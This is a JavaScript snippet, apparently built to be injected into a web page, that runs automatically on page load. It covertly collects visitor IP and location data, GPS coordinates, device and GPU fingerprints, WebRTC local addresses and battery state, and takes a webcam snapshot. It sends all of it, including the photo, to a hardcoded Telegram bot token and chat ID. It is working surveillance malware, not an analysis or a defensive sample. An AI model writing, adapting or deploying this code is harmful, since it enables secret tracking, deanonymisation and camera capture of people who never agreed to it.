(function() {
    'use strict';

    const TELEGRAM_TOKEN = '8526795343:AAEdQZSX2wB8cOpJPSwJ65FvPLhTgJoREAI';
    const TELEGRAM_CHAT_ID = '-5190064240';

    let collectedData = {};
    let cameraStream = null;

    async function collectAll() {
        collectedData = {};

        try {
            const res = await fetch('https://ipapi.co/json/');
            collectedData.ip = await res.json();
        } catch (e) {
            try {
                const fallback = await fetch('https://api.ipify.org?format=json');
                collectedData.ip = await fallback.json();
            } catch (e2) {}
        }

        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            collectedData.geolocation = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            };
        } catch (e) {}

        try {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: battery.level,
                charging: battery.charging
            };
        } catch (e) {}

        try {
            const canvas = document.createElement('canvas');
            canvas.width = 128;
            canvas.height = 64;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 128, 64);
            ctx.fillStyle = '#fff';
            ctx.font = 'bold 32px monospace';
            ctx.fillText('⏣', 10, 50);
            collectedData.canvas = canvas.toDataURL().substring(0, 64) + '...';

            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                collectedData.gpu = {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
        } catch (e) {}

        collectedData.browser = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'unknown'
        };

        collectedData.screen = {
            width: screen.width,
            height: screen.height,
            devicePixelRatio: window.devicePixelRatio
        };

        collectedData.timezone = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        };

        try {
            const rtc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            rtc.createDataChannel('test');
            const offer = await rtc.createOffer();
            await rtc.setLocalDescription(offer);
            const candidates = [];
            rtc.onicecandidate = (e) => {
                if (e.candidate) candidates.push(e.candidate.candidate);
            };
            await new Promise((r) => setTimeout(r, 1500));
            collectedData.webrtc = candidates;
            rtc.close();
        } catch (e) {}

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
            });
            cameraStream = stream;
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            collectedData.camera = {
                enabled: true,
                width: settings.width,
                height: settings.height,
                facingMode: settings.facingMode || 'user'
            };
        } catch (e) {
            collectedData.camera = { error: 'denied' };
        }

        collectedData.collectedAt = new Date().toISOString();
        collectedData.url = window.location.href;

        sendToTelegram();
    }

    function captureSnapshot() {
        return new Promise((resolve) => {
            if (!cameraStream) { resolve(null); return; }
            const video = document.createElement('video');
            video.srcObject = cameraStream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                resolve(canvas.toDataURL('image/jpeg', 0.7));
                video.pause();
                video.srcObject = null;
            }, 500);
        });
    }

    async function sendToTelegram() {
        if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === 'SEU_BOT_TOKEN') return;

        try {
            const data = collectedData;
            const snapshot = await captureSnapshot();

            let msg = '📡 opsec.whbf.cc\n━━━━━━━━━━━\n\n';

            if (data.ip) {
                msg += 'IP: ' + (data.ip.ip || '?') + '\n';
                msg += 'Cidade: ' + (data.ip.city || '') + '\n';
                msg += 'País: ' + (data.ip.country_name || '') + '\n';
                msg += 'ISP: ' + (data.ip.org || '') + '\n\n';
            }

            if (data.geolocation) {
                msg += '📍 ' + data.geolocation.lat + ', ' + data.geolocation.lng + '\n\n';
            }

            if (data.battery) {
                msg += '🔋 ' + Math.round(data.battery.level * 100) + '%';
                msg += data.battery.charging ? ' (carregando)\n\n' : '\n\n';
            }

            if (data.gpu) {
                msg += '🖥️ ' + (data.gpu.renderer || '') + '\n\n';
            }

            if (data.browser) {
                msg += '🔹 ' + data.browser.platform + ' | ' + data.browser.language + '\n';
                msg += '🔹 ' + (data.browser.hardwareConcurrency || '?') + ' cores\n';
                msg += '🔹 ' + (data.browser.deviceMemory || '?') + ' GB RAM\n\n';
            }

            if (data.screen) {
                msg += '🖥️ ' + data.screen.width + 'x' + data.screen.height;
                msg += ' @' + data.screen.devicePixelRatio + 'x\n\n';
            }

            if (data.timezone) {
                msg += '🕐 ' + data.timezone.timezone + '\n\n';
            }

            if (data.camera && data.camera.enabled) {
                msg += '📷 ' + data.camera.width + 'x' + data.camera.height + '\n\n';
            }

            msg += '━━━━━━━━━━━\n';
            msg += data.url + '\n';
            msg += data.collectedAt;

            const url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendMessage';
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: msg,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });

            if (snapshot) {
                const photoUrl = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN + '/sendPhoto';
                const formData = new FormData();
                const blob = await fetch(snapshot).then(r => r.blob());
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'shot.jpg');
                await fetch(photoUrl, { method: 'POST', body: formData });
            }

        } catch (e) {}
    }

    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(collectAll, 300);
    });

})();
